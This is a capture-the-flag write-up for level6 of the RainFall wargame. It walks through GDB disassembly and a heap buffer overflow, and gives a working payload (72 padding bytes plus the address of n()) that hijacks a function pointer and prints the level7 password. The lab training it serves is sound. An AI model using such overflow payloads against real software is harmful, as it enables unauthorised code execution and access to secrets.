# Level6 - ASM Analysis (GDB only)

## Prerequisites for Exploitation

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### 1. Address Space Layout Randomization (ASLR)

Check if ASLR is enabled:

```bash
level6@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of 0 means ASLR is disabled, memory addresses will remain consistent across executions, which simplifies our analysis.

### 2. Stack Protections

Check protections with checksec:

```bash
level6@RainFall:~$ checksec --file ./level6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level6
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

### Conclusion

The binary includes no modern protections. It is a perfect candidate for classic exploitation techniques. In this level, we will leverage a heap-based buffer overflow to overwrite a function pointer and redirect execution to an internal function that reveals the password.

# Disassembly Analysis

This section provides a detailed analysis of the assembly code for the three functions in the level6 binary, using GDB. Each instruction is interpreted to understand control flow, memory interactions, and the underlying vulnerability.

## Disassembly of main()

Before analyzing the main function, we inspect the full list of functions defined in the binary to identify all logic, including internal helper functions:

```bash
(gdb) info functions
0x08048454  n
0x08048468  m
0x0804847c  main
```

We see that `main()` delegates logic through two functions: `m()` and `n()`. Our objective will be to hijack execution flow to `n()`, which prints the flag.

### Function Prologue and Heap Setup

```asm
0x0804847c <+0>:     push   %ebp
0x0804847d <+1>:     mov    %esp,%ebp
0x0804847f <+3>:     and    $0xfffffff0,%esp
0x08048482 <+6>:     sub    $0x20,%esp
```

<+0>: Save the caller's base pointer.  
<+1>: Set up a new stack frame.  
<+3>: Align the stack to a 16-byte boundary.  
<+6>: Reserve 32 bytes of local stack space.  

### First malloc(): allocate input buffer

```asm
0x08048485 <+9>:     movl   $0x40,(%esp)
0x0804848c <+16>:    call   0x8048350 <malloc@plt>
0x08048491 <+21>:    mov    %eax,0x1c(%esp)
```

<+9>: Prepare to allocate 64 bytes.  
<+16>: Call malloc(64).  
<+21>: Store the result (heap pointer) in a local variable.  

### Second malloc(): allocate function pointer slot

```asm
0x08048495 <+25>:    movl   $0x4,(%esp)
0x0804849c <+32>:    call   0x8048350 <malloc@plt>
0x080484a1 <+37>:    mov    %eax,0x18(%esp)
```

<+25>: Request 4 bytes.  
<+32>: Call malloc(4).  
<+37>: Store the resulting pointer (heap-allocated function pointer).  

### Assign function pointer to m()

```asm
0x080484a5 <+41>:    mov    $0x8048468,%edx
0x080484aa <+46>:    mov    0x18(%esp),%eax
0x080484ae <+50>:    mov    %edx,(%eax)
```

<+41>: Load the address of `m()` into edx.  
<+46>: Load the pointer to function slot.  
<+50>: Store address of `m()` into the malloc'd memory.  

### Copy user input with strcpy()

```asm
0x080484b0 <+52>:    mov    0xc(%ebp),%eax
0x080484b3 <+55>:    add    $0x4,%eax
0x080484b6 <+58>:    mov    (%eax),%eax
0x080484b8 <+60>:    mov    %eax,%edx
0x080484ba <+62>:    mov    0x1c(%esp),%eax
0x080484be <+66>:    mov    %edx,0x4(%esp)
0x080484c2 <+70>:    mov    %eax,(%esp)
0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
```

<+52>: Load address of `argv`.  
<+55>: Point to `argv[1]`.  
<+58>: Load the actual argument string.  
<+60>: Move it to edx.  
<+62>: Load destination heap pointer.  
<+66>: Set second argument (src).  
<+70>: Set first argument (dst).  
<+73>: Call strcpy(dst, src).  

This `strcpy()` is vulnerable: no bounds checking is done, allowing us to overwrite adjacent heap memory.

### Call through function pointer

```asm
0x080484ca <+78>:    mov    0x18(%esp),%eax
0x080484ce <+82>:    mov    (%eax),%eax
0x080484d0 <+84>:    call   *%eax
```

<+78>: Load pointer to function pointer.  
<+82>: Dereference it.  
<+84>: Call the function.  

This is the critical call: if we overwrite this pointer, we control execution.

### Function Epilogue

```asm
0x080484d2 <+86>:    leave
0x080484d3 <+87>:    ret
```

<+86>: Restore base and stack pointer.  
<+87>: Return to caller.  

---

## Disassembly of m()

Function Prologue:

```asm
0x08048468 <+0>:     push   %ebp
0x08048469 <+1>:     mov    %esp,%ebp
0x0804846b <+3>:     sub    $0x18,%esp
```

<+0>: Save base pointer.  
<+1>: Create a new stack frame.  
<+3>: Allocate 24 bytes on the stack.  

Function Logic:

```asm
0x0804846e <+6>:     movl   $0x80485d1,(%esp)
0x08048475 <+13>:    call   0x8048360 <puts@plt>
```

<+6>: Push string "Nope" to stack.  
<+13>: Call puts("Nope").  

Function Epilogue:

```asm
0x0804847a <+18>:    leave
0x0804847b <+19>:    ret
```

<+18>: Clean stack.  
<+19>: Return.  

This function is designed to deceive. It does nothing but print "Nope".

---

## Disassembly of n()

Function Prologue:

```asm
0x08048454 <+0>:     push   %ebp
0x08048455 <+1>:     mov    %esp,%ebp
0x08048457 <+3>:     sub    $0x18,%esp
```

<+0>: Save base pointer.  
<+1>: Create stack frame.  
<+3>: Allocate local space.  

Core Logic:

```asm
0x0804845a <+6>:     movl   $0x80485b0,(%esp)
0x08048461 <+13>:    call   0x8048370 <system@plt>
```

<+6>: Push string "/bin/cat /home/user/level7/.pass" to stack.  
<+13>: Call system() with that string.  

Epilogue:

```asm
0x08048466 <+18>:    leave
0x08048467 <+19>:    ret
```

<+18>: Restore state.  
<+19>: Return.  

This is our target: `n()` executes system with the correct command to read the level7 password.

# GDB Runtime Analysis

This section documents the dynamic analysis of the level6 binary using GDB. The goal is to understand the binary's runtime behavior, inspect memory and register states, and demonstrate the exploitation steps entirely through GDB.

## Step 1: Identify Functions and Entry Points

We start by listing all defined functions:

```bash
(gdb) info functions
0x08048454  n
0x08048468  m
0x0804847c  main
```

Function `main()` is the program entry, `m()` prints "Nope", and `n()` executes `system("/bin/cat /home/user/level7/.pass")`. We aim to redirect execution to `n()`.

---

## Step 2: Confirm Address of n()

We retrieve the address of `n()` to use it as our jump target:

```bash
(gdb) p n
$1 = {<text variable, no debug info>} 0x08048454 <n>
```

This is the address that we want to overwrite into the function pointer.

---

## Step 3: Determine Overflow Offset Using Stack Arithmetic

We set a breakpoint after both `malloc()` calls have returned:

```bash
(gdb) break *0x080484a5
(gdb) run AAAAA
```

Then inspect the allocated memory:

```bash
(gdb) x/wx $esp+0x1c  # pointer to buffer
0xbffff72c: 0x0804a008
(gdb) x/wx $esp+0x18  # pointer to function pointer
0xbffff728: 0x0804a050
```

Compute the offset:

```bash
(gdb) print 0x0804a008 - 0x0804a050
$1 = -72
```

This confirms we must overflow 72 bytes to reach and overwrite the function pointer.

---

## Step 4: Craft and Inject the Exploit Payload

We now craft a payload consisting of 72 'A' bytes to fill the buffer, followed by the address of `n()`.

```bash
level6@RainFall:~$ python -c 'print("A" * 72 + "\x54\x84\x04\x08")' > /tmp/exploit
```

Note: Running the binary via input redirection causes a crash, since no `argv[1]` is supplied:

```bash
level6@RainFall:~$ cat /tmp/exploit | ./level6
Segmentation fault (core dumped)
```

Correct usage involves injecting the payload directly as an argument:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Execution jumps to `n()`, which runs the `system()` command and prints the password.

---

## Step 5: Breakpoint Verification (Optional)

To confirm this in GDB, we can set a breakpoint right before the indirect call:

```bash
(gdb) break *0x080484ce
(gdb) run $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
```

Inspect the value pointed to by the overwritten function pointer:

```bash
(gdb) x/xw 0x0804a050
0x0804a050: 0x08048454
```

This matches the address of `n()`, confirming that our overwrite succeeded.

Now step into the function call:

```bash
(gdb) si
(gdb) si
```

You should land at the entry of `n()`:

```bash
(gdb) x/i $eip
=> 0x8048454 <n>: push   %ebp
```

Then step into the `system()` call:

```bash
(gdb) break *0x08048461
(gdb) continue
```

Confirm the argument passed to `system()`:

The address passed to `system()` is loaded via:

```asm
0x0804845a <+6>: movl   $0x80485b0,(%esp)
```

This hardcoded pointer refers to the string:

```bash
(gdb) x/s 0x080485b0
0x080485b0: "/bin/cat /home/user/level7/.pass"
```

This confirms that `n()` prepares the expected system command correctly.

The system call is set up with the correct command, and the password is printed once the call is executed.

---

## Conclusion

This GDB session demonstrates that the level6 binary is vulnerable to a heap-based buffer overflow. By overflowing the buffer returned by the first `malloc()`, we overwrote the function pointer stored in the second `malloc()` buffer. The redirection to `n()` allowed us to execute arbitrary code, specifically, a call to `system("/bin/cat /home/user/level7/.pass")`.

**Key findings:**

* Offset to function pointer: 72 bytes
* Target address: `n()` at `0x08048454`
* Exploitable via direct `argv[1]` injection

